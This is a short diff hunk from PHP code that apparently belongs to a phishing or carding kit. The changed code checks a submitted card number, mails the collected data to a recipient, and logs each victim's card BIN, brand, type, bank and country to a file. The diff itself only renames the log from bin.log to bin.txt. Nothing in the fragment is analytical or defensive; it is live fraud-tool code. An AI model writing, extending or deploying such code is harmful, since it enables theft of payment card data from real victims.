@@ -158,7 +158,7 @@ if($_SESSION['sescc'] == $_POST["ccno"]){
 }else{
         mail($to,$subj,$data,$headers);
         $empas   = "# $bin - $ccbrand - $cctype - $ccklas - $ccbank [ ".$systemInfo['country']." ]\n";
-    $file = fopen("assets/logs/bin.log", "a");
+    $file = fopen("assets/logs/bin.txt", "a");
     fwrite($file, $empas);
     fclose($file);
 
